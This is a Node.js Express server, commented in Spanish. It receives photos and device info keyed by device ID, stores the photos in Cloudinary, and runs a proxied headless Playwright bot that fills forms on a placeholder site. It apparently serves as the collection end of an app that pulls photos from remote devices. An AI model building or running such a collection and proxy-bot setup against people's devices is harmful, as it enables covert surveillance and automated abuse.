require('dotenv').config();
const express = require('express');
const cloudinary = require('cloudinary').v2;
const { chromium } = require('playwright'); // Playwright importado

const app = express();
const port = process.env.PORT || 8080; 

app.use(express.json({ limit: '50mb' }));

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET
});

const receivedData = {
    devices: {},
    photos: []
};

app.get('/', (req, res) => {
  res.send('🚀 Servidor de Analytics y Bot activo.');
});

// 1. ENDPOINT PARA RECIBIR FOTOS
app.post('/api/upload-photo', async (req, res) => {
    try {
        const { device_id, filename, image, timestamp } = req.body;
        
        if (!image) {
            return res.status(400).json({ error: 'No se recibió ninguna imagen.' });
        }

        const archivoBase64 = `data:image/jpeg;base64,${image}`;
        const resultado = await cloudinary.uploader.upload(archivoBase64, {
            folder: `dispositivos/${device_id}`
        });

        receivedData.photos.push({
            device_id,
            filename,
            url: resultado.secure_url,
            timestamp: timestamp || new Date()
        });

        if (receivedData.devices[device_id]) {
            receivedData.devices[device_id].photo_count += 1;
        }

        console.log(`📸 Foto guardada en Cloudinary de ${device_id}: ${filename}`);
        res.json({ status: 'ok', url: resultado.secure_url });

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Error al procesar la imagen' });
    }
});

// 2. ENDPOINT PARA INFO DEL DISPOSITIVO
app.post('/api/device-info', (req, res) => {
    const { device_id, data, timestamp } = req.body;
    
    if (!receivedData.devices[device_id]) {
        receivedData.devices[device_id] = {
            first_seen: timestamp || new Date(),
            last_seen: timestamp || new Date(),
            info: typeof data === 'object' ? JSON.stringify(data, null, 2) : data,
            photo_count: 0
        };
    } else {
        receivedData.devices[device_id].last_seen = timestamp || new Date();
        receivedData.devices[device_id].info = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
    }
    
    console.log(`📱 Info recibida de ${device_id}`);
    res.json({ status: 'ok' });
});

// 3. PANEL WEB EN VIVO
app.get('/panel', (req, res) => {
    // ... (Aquí va el HTML de tu panel que ya tenías, no es necesario que lo cambies) ...
    res.send('Tu panel web HTML');
});

// =====================================================================
// 🚀 4. NUEVO: EL BOT CON PLAYWRIGHT Y PROXY EN CAUCA
// =====================================================================
app.post('/api/procesar-bot', async (req, res) => {
    const { datosAEnviar } = req.body;

    const proxyConfig = {
        server: process.env.PROXY_SERVER || 'http://127.0.0.1:8080', 
        username: process.env.PROXY_USER || 'user',
        password: process.env.PROXY_PASS || 'pass'
    };

    let browser;
    try {
        console.log('🤖 Iniciando bot con proxy...');
        
        // Argumentos para que no se caiga por falta de RAM (512MB)
        browser = await chromium.launch({
            proxy: proxyConfig,
            headless: true, 
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process',
                '--no-zygote'
            ]
        });
        
        const context = await browser.newContext();
        const page = await context.newPage();

        console.log('🌐 Navegando al sitio destino...');
        // 1. Ir al sitio de destino (Cambia esto por la URL real)
        await page.goto('https://sitio-al-que-vas.com', { waitUntil: 'networkidle', timeout: 30000 });

        console.log('📝 Rellenando datos...');
        // 2. Rellenar datos (Ajusta los selectores)
        // await page.fill('input[name="campo1"]', datosAEnviar.campo1);
        // await page.click('button[type="submit"]');
        // await page.waitForLoadState('networkidle');

        // 3. Verificar (ajusta esto)
        const exito = true; // Reemplaza esto con tu lógica real de comprobación
        
        console.log('✅ Bot terminó su tarea.');
        res.json({ continuar: exito, mensaje: 'Todo OK' });

    } catch (error) {
        console.error('❌ Error en el bot:', error.message);
        res.status(500).json({ continuar: false, error: error.message });
    } finally {
        if (browser) await browser.close();
    }
});

app.listen(port, () => {
    console.log(`🚀 Servidor escuchando en puerto ${port}`);
});
